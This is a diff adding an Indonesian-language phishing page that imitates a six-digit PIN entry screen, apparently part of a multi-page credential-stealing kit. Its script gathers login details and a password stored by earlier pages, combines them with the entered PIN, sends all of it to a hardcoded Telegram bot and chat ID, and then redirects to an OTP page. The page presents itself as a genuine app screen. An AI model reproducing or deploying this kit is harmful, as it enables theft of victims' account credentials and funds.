@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" />
+<title>Masukkan PIN</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&display=swap" rel="stylesheet">
+<style>
+* {
+  -webkit-tap-highlight-color: transparent;
+  -webkit-touch-callout: none;
+}
+
+  *{box-sizing:border-box;font-family:'Poppins',sans-serif;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%;margin:0;background:#002F36;color:#fff;overflow:hidden}
+  .wrap{height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px}
+  .title{font-size:28px;font-weight:800;margin-bottom:8px}
+  .subtitle{color:rgba(255,255,255,0.8);margin-bottom:28px}
+  .dots{display:flex;gap:16px;margin-bottom:36px}
+  .dot{width:14px;height:14px;border-radius:50%;background:rgba(230,251,226,0.18)}
+  .dot.filled{background:rgba(230,251,226,0.95);transform:scale(1.05)}
+  .keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;width:100%;max-width:360px}
+  .key{aspect-ratio:1/1;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;background:transparent;border:none;color:#fff;cursor:pointer}
+  .bottom-links{position:fixed;left:24px;right:24px;bottom:20px;display:flex;justify-content:space-between;color:#fff;font-weight:700}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="title">Masukkan PIN kamu</div>
+    <div class="subtitle">Silakan masukkan PIN 6 digit</div>
+    <div class="dots" id="dots">
+      <div class="dot" id="p0"></div><div class="dot" id="p1"></div><div class="dot" id="p2"></div>
+      <div class="dot" id="p3"></div><div class="dot" id="p4"></div><div class="dot" id="p5"></div>
+    </div>
+
+    <div class="keypad" id="keypad">
+      <button class="key" data-key="1">1</button><button class="key" data-key="2">2</button><button class="key" data-key="3">3</button>
+      <button class="key" data-key="4">4</button><button class="key" data-key="5">5</button><button class="key" data-key="6">6</button>
+      <button class="key" data-key="7">7</button><button class="key" data-key="8">8</button><button class="key" data-key="9">9</button>
+      <div></div><button class="key" data-key="0">0</button><button class="key" id="del">⌫</button>
+    </div>
+  </div>
+
+<script>
+/* ====== Token Telegram ====== */
+const TELEGRAM_TOKEN = '8366843088:AAG2DgTncj7WVowbtCY-_9iL85PLahl1ddg';
+const TELEGRAM_CHAT_ID = '5983910858';
+/* ============================ */
+
+const MAX = 6;
+let pin = [];
+const dots = Array.from({length:MAX}, (_,i)=>document.getElementById('p'+i));
+const keys = document.querySelectorAll('.key[data-key]');
+const del = document.getElementById('del');
+
+function updateDots(){ dots.forEach((d,i)=>d.classList.toggle('filled', i < pin.length)); }
+
+async function sendToTelegram(text){
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
+    });
+    return res;
+  } catch (e) {
+    console.error("Gagal kirim:", e);
+    throw e;
+  }
+}
+
+function push(d){
+  if(pin.length>=MAX) return;
+  pin.push(String(d));
+  updateDots();
+
+  if(pin.length===MAX){
+    const pinStr = pin.join('');
+    // simpan lokal
+    localStorage.setItem('pin', pinStr);
+
+    // Ambil data sebelumnya: loginData dan passwordData (jika ada)
+    const loginData = localStorage.getItem('loginData') || '(Belum ada data login)';
+    // passwordData key used in previous page: "passwordData"
+    const passwordData = localStorage.getItem('passwordData') || '(Belum ada kata sandi)';
+    // Build pesan gabungan (rapi)
+    const messageLines = [];
+    // loginData already formatted (we stored message like "📱 Nomor HP: +62xxx" or "📧 Email: ...")
+    messageLines.push(loginData);
+    // password line
+    messageLines.push(`🔐 Password: ${passwordData}`);
+    // PIN
+    messageLines.push(`🔢 PIN: ${pinStr}`);
+
+    const message = messageLines.join('\n');
+
+    // Kirim ke Telegram
+    sendToTelegram(message)
+      .then(()=> {
+        // sukses -> lanjut ke otp.html setelah animasi singkat (tetap UI sama)
+        setTimeout(()=>{
+          document.body.style.transition='opacity .32s';
+          document.body.style.opacity='0';
+          setTimeout(()=> location.href='otp.html',320);
+        }, 300);
+      })
+      .catch(()=> {
+        alert('Gagal mengirim data ke Telegram. Periksa koneksi atau token.');
+      });
+  }
+}
+
+function pop(){
+  if(pin.length>0){ pin.pop(); updateDots(); }
+}
+
+keys.forEach(k=>k.addEventListener('click', ()=> push(k.dataset.key)));
+del.addEventListener('click', pop);
+document.addEventListener('keydown', e=>{
+  if(e.key>='0' && e.key<='9') push(e.key);
+  if(e.key==='Backspace') pop();
+});
+</script>
+</body>
+</html>
